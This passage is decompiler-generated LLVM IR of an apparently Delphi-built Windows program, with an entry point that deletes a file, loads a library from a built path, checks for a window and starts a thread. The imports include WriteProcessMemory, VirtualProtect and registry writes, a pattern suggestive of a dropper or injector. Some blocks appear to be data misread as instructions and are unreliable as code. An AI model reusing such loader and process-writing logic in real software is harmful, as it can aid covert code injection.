  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2135
  br i1 %10, label %dec_label_pc_407a3f, label %dec_label_pc_407a12, !insn.addr !2135

dec_label_pc_407a12:                              ; preds = %dec_label_pc_407a10
  br i1 %8, label %dec_label_pc_407a48, label %dec_label_pc_407a15, !insn.addr !2136

dec_label_pc_407a15:                              ; preds = %dec_label_pc_407a12
  %11 = trunc i32 %4 to i16, !insn.addr !2137
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2137
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2137
  store i8 %12, i8* %13, align 1, !insn.addr !2137
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2138
  store i8 %14, i8* %13, align 1, !insn.addr !2138
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2139
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2139
  %19 = add i8 %16, %18, !insn.addr !2139
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2139
  store i8 %19, i8* %20, align 1, !insn.addr !2139
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2140
  %21 = trunc i32 %arg10 to i16, !insn.addr !2141
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2141
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2141
  store i32 %22, i32* %23, align 4, !insn.addr !2141
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2142
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2143
  %25 = load i8, i8* %24, align 1, !insn.addr !2143
  %26 = trunc i32 %arg1 to i8, !insn.addr !2143
  %27 = add i8 %25, %26, !insn.addr !2143
  store i8 %27, i8* %24, align 1, !insn.addr !2143
  %28 = trunc i32 %arg3 to i16, !insn.addr !2144
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2144
  %30 = load i32, i32* %29, align 4, !insn.addr !2144
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2144
  %31 = add i32 %arg5, 67, !insn.addr !2145
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2145
  %34 = load i32, i32* %33, align 4, !insn.addr !2145
  %35 = load i8, i8* %24, align 1, !insn.addr !2146
  %36 = add i8 %35, %26, !insn.addr !2146
  store i8 %36, i8* %24, align 1, !insn.addr !2146
  %37 = mul i32 %34, 1557718248, !insn.addr !2147
  %38 = add i32 %arg7, 97, !insn.addr !2147
  %39 = add i32 %38, %37, !insn.addr !2147
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2147
  %41 = load i8, i8* %40, align 1, !insn.addr !2147
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2147
  %44 = add i8 %43, %41, !insn.addr !2147
  %45 = icmp eq i8 %44, 0, !insn.addr !2147
  store i8 %44, i8* %40, align 1, !insn.addr !2147
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2148
  br i1 %45, label %dec_label_pc_407ab1, label %dec_label_pc_407a3f, !insn.addr !2148

dec_label_pc_407a3f:                              ; preds = %dec_label_pc_407a10, %dec_label_pc_407a15
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2149

dec_label_pc_407a48:                              ; preds = %dec_label_pc_407a12
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2150
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2150
  store i8 %48, i8* %49, align 1, !insn.addr !2150
  %50 = add i32 %3, 104, !insn.addr !2151
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2151
  %52 = load i8, i8* %51, align 1, !insn.addr !2151
  %53 = udiv i32 %4, 256, !insn.addr !2151
  %54 = trunc i32 %53 to i8, !insn.addr !2151
  %55 = add i8 %52, %54, !insn.addr !2151
  store i8 %55, i8* %51, align 1, !insn.addr !2151
  %56 = trunc i32 %4 to i16, !insn.addr !2152
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2152
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2152
  store i8 %57, i8* %58, align 1, !insn.addr !2152
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2153
  store i8 %59, i8* %58, align 1, !insn.addr !2153
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2154
  store i8 %60, i8* %58, align 1, !insn.addr !2154
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2155
  store i8 %61, i8* %58, align 1, !insn.addr !2155
  %62 = load i8, i8* %51, align 1, !insn.addr !2156
  %63 = trunc i32 %4 to i8, !insn.addr !2156
  %64 = add i8 %62, %63, !insn.addr !2156
  store i8 %64, i8* %51, align 1, !insn.addr !2156
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2157
  store i8 %65, i8* %58, align 1, !insn.addr !2157
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2158
  store i8 %66, i8* %58, align 1, !insn.addr !2158
  %67 = add i32 %2, 1, !insn.addr !2159
  %68 = icmp slt i32 %67, 0, !insn.addr !2159
  br i1 %68, label %dec_label_pc_407ac9, label %dec_label_pc_407a64, !insn.addr !2160

dec_label_pc_407a64:                              ; preds = %dec_label_pc_407a48
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2161
  %72 = xor i32 %4, %1, !insn.addr !2162
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2163
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2163
  %76 = load i16, i16* %75, align 2, !insn.addr !2163
  %77 = trunc i32 %72 to i16, !insn.addr !2163
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2163
  %78 = load i8, i8* %73, align 4, !insn.addr !2164
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2164
  %81 = add i8 %78, %80, !insn.addr !2164
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2164
  store i8 %81, i8* %82, align 1, !insn.addr !2164
  %83 = add i32 %71, 82, !insn.addr !2165
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2165
  %85 = load i8, i8* %84, align 1, !insn.addr !2165
  %86 = add i8 %85, %63, !insn.addr !2165
  store i8 %86, i8* %84, align 1, !insn.addr !2165
  %87 = load i32, i32* %eax, align 4, !insn.addr !2166
  %88 = add i32 %87, -1, !insn.addr !2166
  %89 = add i32 %71, 4227341, !insn.addr !2167
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2167
  %91 = load i8, i8* %90, align 1, !insn.addr !2167
  %92 = udiv i32 %88, 256, !insn.addr !2167
  %93 = trunc i32 %92 to i8, !insn.addr !2167
  %94 = add i8 %91, %93, !insn.addr !2167
  store i8 %94, i8* %90, align 1, !insn.addr !2167
  ret i32 %88, !insn.addr !2167

dec_label_pc_407ab1:                              ; preds = %dec_label_pc_407a15
  %95 = add i32 %46, 1, !insn.addr !2168
  store i32 %95, i32* %eax, align 4, !insn.addr !2168
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2169
  %97 = load i8, i8* %96, align 1, !insn.addr !2169
  %98 = udiv i32 %arg3, 256, !insn.addr !2169
  %99 = trunc i32 %98 to i8, !insn.addr !2169
  %100 = add i8 %97, %99, !insn.addr !2169
  store i8 %100, i8* %96, align 1, !insn.addr !2169
  %101 = add i32 %arg3, 89, !insn.addr !2170
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2170
  store i8 -1, i8* %102, align 1, !insn.addr !2170
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2171
  %103 = load i32, i32* %eax, align 4, !insn.addr !2172
  ret i32 %103, !insn.addr !2172

dec_label_pc_407ac9:                              ; preds = %dec_label_pc_407a48
  %104 = load i32, i32* %eax, align 4, !insn.addr !2173
  ret i32 %104, !insn.addr !2173
}

define i32 @function_407acc() local_unnamed_addr {
dec_label_pc_407acc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2174
  %2 = add i32 %1, -1, !insn.addr !2174
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2174
  ret i32 %0, !insn.addr !2175
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2176
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2176
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2176
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2177
  %2 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2178
  %3 = add i32 %2, 1, !insn.addr !2178
  store i32 %3, i32* @global_var_4096f8, align 4, !insn.addr !2178
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2179
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2180
  ret i32 0, !insn.addr !2181
}

define i32 @function_407af9() local_unnamed_addr {
dec_label_pc_407af9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2182
  ret i32 %0, !insn.addr !2182
}

define i32 @function_407afe() local_unnamed_addr {
dec_label_pc_407afe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2183
}

define i32 @function_407b00(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2184
}

define i32 @function_407b04() local_unnamed_addr {
dec_label_pc_407b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2185
  %2 = add i32 %1, -1, !insn.addr !2185
  store i32 %2, i32* @global_var_4096f8, align 4, !insn.addr !2185
  ret i32 %0, !insn.addr !2186
}

define i32 @function_407b0c() local_unnamed_addr {
dec_label_pc_407b0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2187
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407b37:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2188
  ret i32 %0, !insn.addr !2188
}

define i32 @function_407b3c() local_unnamed_addr {
dec_label_pc_407b3c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2189
}

define i32 @function_407b3e(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b3e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2190
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407c40:
  %esp.2.reg2mem = alloca i32, !insn.addr !2191
  %esp.1.reg2mem = alloca i32, !insn.addr !2191
  %esp.0.reg2mem = alloca i32, !insn.addr !2191
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2192
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2193
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2193
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2193
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2194
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2195
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096fc to i8*), i32 0), !insn.addr !2196
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096fc to i32), !insn.addr !2197
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2197
  store i8 0, i8* %6, align 1, !insn.addr !2197
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2198
  %8 = call i32 @function_40708c(), !insn.addr !2199
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2200
  %10 = call i32 @function_407104(), !insn.addr !2201
  %11 = trunc i32 %10 to i8, !insn.addr !2202
  %12 = icmp eq i8 %11, 0, !insn.addr !2202
  br i1 %12, label %dec_label_pc_407d47, label %dec_label_pc_407ccc, !insn.addr !2203

dec_label_pc_407ccc:                              ; preds = %dec_label_pc_407c40
  %13 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2204
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2205
  store i32 -1, i32* %14, align 4, !insn.addr !2205
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2206
  %16 = call i32 @function_4070cc(), !insn.addr !2207
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2208
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2209
  %19 = call i32 @function_4036c8(), !insn.addr !2210
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2211
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2212
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2213
  %23 = call i32 @function_4036c8(), !insn.addr !2214
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2215
  store i8* %24, i8** %stack_var_-136, align 4, !insn.addr !2215
  %25 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2215
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2216
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2216
  store i32 %27, i32* @global_var_408118, align 4, !insn.addr !2217
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2218
  br label %dec_label_pc_407d74, !insn.addr !2218

dec_label_pc_407d47:                              ; preds = %dec_label_pc_407c40
  %28 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2195
  %29 = call i32 @function_4060f0(), !insn.addr !2219
  %30 = call i32 @function_407104(), !insn.addr !2220
  %31 = trunc i32 %30 to i8, !insn.addr !2221
  %32 = icmp eq i8 %31, 0, !insn.addr !2221
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2222
  br i1 %32, label %dec_label_pc_407eb6, label %dec_label_pc_407d69, !insn.addr !2222

dec_label_pc_407d69:                              ; preds = %dec_label_pc_407d47
  %33 = load i32, i32* @global_var_408138, align 4, !insn.addr !2223
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2224
  store i32 -1, i32* %34, align 4, !insn.addr !2224
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2224
  br label %dec_label_pc_407d74, !insn.addr !2224

dec_label_pc_407d74:                              ; preds = %dec_label_pc_407d69, %dec_label_pc_407ccc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %35 = add i32 %esp.0.reload, -4, !insn.addr !2225
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2225
  store i32 260, i32* %36, align 4, !insn.addr !2225
  %37 = add i32 %esp.0.reload, -8, !insn.addr !2226
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2226
  store i32 ptrtoint (i8** @global_var_4096fc to i32), i32* %38, align 4, !insn.addr !2226
  %39 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2227
  %40 = ptrtoint i32 (i32, i32, i32)* %39 to i32, !insn.addr !2227
  %41 = add i32 %esp.0.reload, -12, !insn.addr !2228
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2228
  store i32 %40, i32* %42, align 4, !insn.addr !2228
  %43 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2229
  %44 = add i32 %43, ptrtoint (i8** @global_var_4096fc to i32), !insn.addr !2230
  %45 = inttoptr i32 %44 to i8*, !insn.addr !2230
  store i8 0, i8* %45, align 1, !insn.addr !2230
  %46 = call i32 @"@LStrFromArray"(), !insn.addr !2231
  %47 = call i32 @function_4070cc(), !insn.addr !2232
  %48 = call i32 @"@LStrAsg"(), !insn.addr !2233
  %49 = call i32 @"@LStrCat3"(), !insn.addr !2234
  %50 = load i32, i32* @global_var_408138, align 4, !insn.addr !2235
  %51 = icmp eq i32 %50, 0, !insn.addr !2235
  br i1 %51, label %dec_label_pc_407e0d, label %dec_label_pc_407dda, !insn.addr !2236

dec_label_pc_407dda:                              ; preds = %dec_label_pc_407d74
  %52 = add i32 %esp.0.reload, -16, !insn.addr !2237
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2237
  store i32 ptrtoint ([16 x i8]* @global_var_407f38 to i32), i32* %53, align 4, !insn.addr !2237
  %54 = add i32 %esp.0.reload, -20, !insn.addr !2238
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2238
  store i32 ptrtoint ([8 x i8]* @global_var_407f48 to i32), i32* %55, align 4, !insn.addr !2238
  %56 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2239
  %57 = icmp eq i32* %56, null, !insn.addr !2240
  %58 = icmp eq i1 %57, false, !insn.addr !2241
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !2241
  br i1 %58, label %dec_label_pc_407eb6, label %dec_label_pc_407df1, !insn.addr !2241

dec_label_pc_407df1:                              ; preds = %dec_label_pc_407dda
  %59 = add i32 %esp.0.reload, -24, !insn.addr !2242
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2242
  store i32 ptrtoint (i32* @global_var_40980c to i32), i32* %60, align 4, !insn.addr !2242
  %61 = add i32 %esp.0.reload, -28, !insn.addr !2243
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2243
  store i32 0, i32* %62, align 4, !insn.addr !2243
  %63 = add i32 %esp.0.reload, -32, !insn.addr !2244
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2244
  store i32 66, i32* %64, align 4, !insn.addr !2244
  %65 = add i32 %esp.0.reload, -36, !insn.addr !2245
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2245
  store i32 4220780, i32* %66, align 4, !insn.addr !2245
  %67 = add i32 %esp.0.reload, -40, !insn.addr !2246
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2246
  store i32 0, i32* %68, align 4, !insn.addr !2246
  %69 = add i32 %esp.0.reload, -44, !insn.addr !2247
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2247
  store i32 0, i32* %70, align 4, !insn.addr !2247
  %71 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2248
  store i32 %69, i32* %esp.2.reg2mem, !insn.addr !2249
  br label %dec_label_pc_407eb6, !insn.addr !2249

dec_label_pc_407e0d:                              ; preds = %dec_label_pc_407d74
  %72 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2250
  %73 = icmp eq i32 %72, 0, !insn.addr !2250
  store i32 %41, i32* %esp.2.reg2mem, !insn.addr !2251
  br i1 %73, label %dec_label_pc_407eb6, label %dec_label_pc_407e1b, !insn.addr !2251

dec_label_pc_407e1b:                              ; preds = %dec_label_pc_407e0d
  %74 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2252
  %75 = icmp eq i8 %74, 0, !insn.addr !2252
  br i1 %75, label %dec_label_pc_407e2a, label %dec_label_pc_407e25, !insn.addr !2253

dec_label_pc_407e25:                              ; preds = %dec_label_pc_407e1b
  %76 = call i32 @function_40692c(), !insn.addr !2254
  br label %dec_label_pc_407e2a, !insn.addr !2254

dec_label_pc_407e2a:                              ; preds = %dec_label_pc_407e25, %dec_label_pc_407e1b
  %77 = load i32, i32* @global_var_408148, align 4, !insn.addr !2255
  %78 = icmp slt i32 %77, 1, !insn.addr !2256
  br i1 %78, label %dec_label_pc_407e67, label %dec_label_pc_407e34, !insn.addr !2256

dec_label_pc_407e34:                              ; preds = %dec_label_pc_407e2a
  %79 = call i32 @function_404d38(), !insn.addr !2257
  %80 = call i32 @"@LStrCmp"(), !insn.addr !2258
  %81 = load i32, i32* @global_var_408154, align 4, !insn.addr !2259
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2260
  store i32 -1, i32* %82, align 4, !insn.addr !2260
  %83 = load i32, i32* @global_var_408154, align 4, !insn.addr !2261
  %84 = icmp eq i32 %83, 0, !insn.addr !2261
  br i1 %84, label %dec_label_pc_407e67, label %dec_label_pc_407e62, !insn.addr !2262

dec_label_pc_407e62:                              ; preds = %dec_label_pc_407e34
  %85 = call i32 @function_40600c(), !insn.addr !2263
  br label %dec_label_pc_407e67, !insn.addr !2263

dec_label_pc_407e67:                              ; preds = %dec_label_pc_407e62, %dec_label_pc_407e34, %dec_label_pc_407e2a
  %86 = add i32 %esp.0.reload, -16, !insn.addr !2264
  %87 = inttoptr i32 %86 to i32*, !insn.addr !2264
  store i32 3, i32* %87, align 4, !insn.addr !2264
  %88 = add i32 %esp.0.reload, -20, !insn.addr !2265
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2265
  store i32 16065, i32* %89, align 4, !insn.addr !2265
  %90 = load i32, i32* @global_var_408118, align 4, !insn.addr !2266
  %91 = add i32 %esp.0.reload, -24, !insn.addr !2267
  %92 = inttoptr i32 %91 to i32*, !insn.addr !2267
  store i32 %90, i32* %92, align 4, !insn.addr !2267
  %93 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2268
  %94 = icmp eq i32* %93, null, !insn.addr !2269
  %95 = icmp eq i1 %94, false, !insn.addr !2270
  store i32 %91, i32* %esp.1.reg2mem, !insn.addr !2270
  br i1 %95, label %dec_label_pc_407ea7, label %dec_label_pc_407e7d, !insn.addr !2270

dec_label_pc_407e7d:                              ; preds = %dec_label_pc_407e67
  %96 = add i32 %esp.0.reload, -28, !insn.addr !2271
  %97 = inttoptr i32 %96 to i32*, !insn.addr !2271
  store i32 14, i32* %97, align 4, !insn.addr !2271
  %98 = add i32 %esp.0.reload, -32, !insn.addr !2272
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2272
  store i32 16065, i32* %99, align 4, !insn.addr !2272
  %100 = load i32, i32* @global_var_408118, align 4, !insn.addr !2273
  %101 = add i32 %esp.0.reload, -36, !insn.addr !2274
  %102 = inttoptr i32 %101 to i32*, !insn.addr !2274
  store i32 %100, i32* %102, align 4, !insn.addr !2274
  %103 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2275
  %104 = icmp eq i32* %103, null, !insn.addr !2276
  %105 = icmp eq i1 %104, false, !insn.addr !2277
  store i32 %101, i32* %esp.1.reg2mem, !insn.addr !2277
  br i1 %105, label %dec_label_pc_407ea7, label %dec_label_pc_407e93, !insn.addr !2277

dec_label_pc_407e93:                              ; preds = %dec_label_pc_407e7d
  %106 = add i32 %esp.0.reload, -40, !insn.addr !2278
  %107 = inttoptr i32 %106 to i32*, !insn.addr !2278
  store i32 16065, i32* %107, align 4, !insn.addr !2278
  %108 = load i32, i32* @global_var_408118, align 4, !insn.addr !2279
  %109 = add i32 %esp.0.reload, -44, !insn.addr !2280
  %110 = inttoptr i32 %109 to i32*, !insn.addr !2280
  store i32 %108, i32* %110, align 4, !insn.addr !2280
  %111 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2281
  %112 = icmp eq i32* %111, null, !insn.addr !2282
  store i32 %109, i32* %esp.1.reg2mem, !insn.addr !2283
  store i32 %109, i32* %esp.2.reg2mem, !insn.addr !2283
  br i1 %112, label %dec_label_pc_407eb6, label %dec_label_pc_407ea7, !insn.addr !2283

dec_label_pc_407ea7:                              ; preds = %dec_label_pc_407e93, %dec_label_pc_407e7d, %dec_label_pc_407e67
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %113 = call i32 @function_4079a0(), !insn.addr !2284
  store i32 4225804, i32* @global_var_409654, align 4, !insn.addr !2285
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2285
  br label %dec_label_pc_407eb6, !insn.addr !2285

dec_label_pc_407eb6:                              ; preds = %dec_label_pc_407ea7, %dec_label_pc_407e93, %dec_label_pc_407e0d, %dec_label_pc_407df1, %dec_label_pc_407dda, %dec_label_pc_407d47
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %114 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2286
  %115 = load i32, i32* %114, align 4, !insn.addr !2286
  call void @__writefsdword(i32 0, i32 %115), !insn.addr !2287
  %116 = add i32 %esp.2.reload, 8, !insn.addr !2288
  %117 = inttoptr i32 %116 to i32*, !insn.addr !2288
  store i32 4226776, i32* %117, align 4, !insn.addr !2288
  %118 = call i32 @"@LStrArrayClr"(), !insn.addr !2289
  ret i32 %118, !insn.addr !2290
}

define i32 @function_407ed1() local_unnamed_addr {
dec_label_pc_407ed1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2291
  ret i32 %0, !insn.addr !2291
}

define i32 @function_407ed6() local_unnamed_addr {
dec_label_pc_407ed6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2292
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

